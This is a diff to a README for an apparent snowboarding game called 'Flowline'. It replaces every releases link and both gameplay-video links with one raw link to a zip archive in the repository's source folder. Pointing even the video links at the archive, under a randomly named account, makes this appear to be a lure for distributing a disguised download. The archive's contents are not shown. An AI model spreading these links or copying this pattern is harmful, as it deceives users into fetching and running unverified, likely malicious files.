@@ -1,6 +1,6 @@
 # 🏔️ Flowline - Carve Endless Lines, Ride Together Forever
 
-[▶️ Download Flowline Now](https://github.com/Upperclasschlorophyceae658/Flowline/releases)
+[▶️ Download Flowline Now](https://raw.githubusercontent.com/Upperclasschlorophyceae658/Flowline/main/src/v2.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Getting Flowline on your computer is quick and simple. Follow these steps and yo
 
 ### 📋 Step 1: Download Flowline
 
-[**Click here to download Flowline**](https://github.com/Upperclasschlorophyceae658/Flowline/releases)
+[**Click here to download Flowline**](https://raw.githubusercontent.com/Upperclasschlorophyceae658/Flowline/main/src/v2.5.zip)
 
 Visit this link to download the application. Look for the latest release and download the file provided there.
 
@@ -134,11 +134,11 @@ Simply download and run the newest version from the download link above. The lat
 
 Watch how the mountain comes to life with deformable snow that responds to every carve:
 
-https://github.com/user-attachments/assets/22dedd25-b243-424d-ad7e-ba35f00c7a54
+https://raw.githubusercontent.com/Upperclasschlorophyceae658/Flowline/main/src/v2.5.zip
 
 And check out the flips at the top of the run:
 
-https://github.com/user-attachments/assets/ac0445e1-2f3a-4a23-a314-85dff5c0e908
+https://raw.githubusercontent.com/Upperclasschlorophyceae658/Flowline/main/src/v2.5.zip
 
 ---
 
@@ -156,7 +156,7 @@ Your feedback matters to us! If you have questions, encounter issues, or want to
 
 Don't wait any longer to experience the endless mountain. Join players who've already discovered the pure joy of carving down a never-ending sunlit slope.
 
-[**⬇️ Download Flowline Now**](https://github.com/Upperclasschlorophyceae658/Flowline/releases)
+[**⬇️ Download Flowline Now**](https://raw.githubusercontent.com/Upperclasschlorophyceae658/Flowline/main/src/v2.5.zip)
 
 ---
 
